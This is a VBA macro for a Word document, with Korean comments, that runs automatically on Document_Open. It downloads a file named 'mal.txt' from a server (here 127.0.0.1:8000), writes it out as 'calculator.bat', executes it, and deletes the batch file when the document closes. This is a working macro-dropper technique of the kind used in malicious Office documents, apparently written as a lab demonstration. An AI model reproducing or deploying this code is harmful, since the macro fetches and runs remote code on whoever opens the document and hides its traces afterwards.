Private Sub Document_Open()
    DownloadAndCreateCalculator
End Sub

Sub DownloadAndCreateCalculator()
    Dim objShell As Object
    Dim http As Object
    Dim url As String
    Dim fileContent As String
    Dim batFilePath As String

    ' 외부 서버 URL 설정
    url = "http://127.0.0.1:8000/mal.txt" ' abc.txt 파일이 있는 경로로 수정

    ' HTTP 요청을 보내서 파일 내용 가져오기
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.send
    fileContent = http.responseText

    ' bat 파일 저장 경로 설정
    batFilePath = "C:\TEMP\calculator.bat"

    ' bat 파일에 파일 내용 쓰기
    Dim fileNum As Integer
    fileNum = FreeFile
    Open batFilePath For Output As #fileNum
    Print #fileNum, fileContent
    Close #fileNum

    ' bat 파일 실행
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run batFilePath
    Set objShell = Nothing
End Sub

Private Sub Document_Close()
    Dim fileToDelete As String
    fileToDelete = "C:\TEMP\calculator.bat"
    
    ' 파일이 존재하는지 확인한 후 삭제
    If Dir(fileToDelete) <> "" Then
        Kill fileToDelete
    End If
End Sub
